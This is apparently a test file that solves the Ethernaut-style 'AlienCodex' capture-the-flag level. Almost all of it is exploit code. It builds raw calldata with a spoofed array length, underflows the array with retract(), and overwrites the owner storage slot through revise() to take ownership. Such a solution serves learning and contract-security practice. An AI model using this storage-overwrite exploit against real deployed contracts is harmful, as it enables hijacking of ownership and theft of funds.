const AlienCodex = artifacts.require('AlienCodex');
const AlienCodexFactory = artifacts.require('AlienCodexFactory');
const TestLevel = artifacts.require('TestLevel');

contract('AlienCodex', async (accounts) => {

    let factory;
    let test;
    let instanceAddress;

    const hacker = accounts[2];

    before( async () => {
        
        factory = await AlienCodexFactory.new();
        test = await TestLevel.new();
        let tx = await test.createLevelInstance(factory.address);

        instanceAddress = tx.logs[0].args.instance;
        
        let owner = await AlienCodex.at(instanceAddress).owner();
        expect(owner).to.equal(factory.address,
            'victim contract not initialized correctly');
        expect(owner).to.not.equal(hacker,
            'victim contract not initialized correctly');
    });

    it('make contact', async () => {
        
        // NOTE:
        // Assemble the transaction data which encodes
        // a function call with a dynamic type according to ABI
        // https://solidity.readthedocs.io/en/develop/abi-spec.html

        // FUNCTION SELECTOR
        let makeContactMethodID = web3.sha3('make_contact(bytes32[])').substring(0, 10);
        
        // HEAD
        let arrayOffset =  '0000000000000000000000000000000000000000000000000000000000000020'   // skip 1 x 32 bytes since
                                                                                                // tail starts after this word (32 bytes slot)

        // TAIL
        let arrayLength =  'F000000000000000000000000000000000000000000000000000000000000000'   // spoof arrayLength > 2**200 to pass the assert
        let arrayContent = '0000000000000000000000000000000000000000000000000000000000000000'   // array data is irrelevant

        let _data = makeContactMethodID 
                    + arrayOffset
                    + arrayLength
                    + arrayContent

        await AlienCodex.at(instanceAddress).sendTransaction({
            from: hacker,
            data: _data
        });

        let madeContact = await AlienCodex.at(instanceAddress).contact.call();
        expect(madeContact).to.equal(true,
            'failed to make contact');
    });
    
    it('become the owner', async () => {

        // underflow array length to 2**256 - 1 
        // to allow modification of contract storage with revise function
        await AlienCodex.at(instanceAddress).retract();

        // FUNCTION SELECTOR
        let reviseMethodID = web3.sha3('revise(uint256,bytes32)').substring(0, 10);

        // HEAD
        const index = '4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a';       // 2^256 - uint256(keccak256(bytes32(1)))
                                                                                                // converted to hex

        const content = '000000000000000000000001' + hacker.substring(2, 42);                   // contact and owner mashed
                                                                                                // into one slot

        // TAIL is empty for Static Types

        let _data = reviseMethodID
                    + index
                    + content;

        await AlienCodex.at(instanceAddress).sendTransaction({
            from: hacker,
            data: _data
        });
        
        let owner = await AlienCodex.at(instanceAddress).owner();
        expect(owner).to.equal(hacker,
            'attacker could not take ownership of victim');
    });
});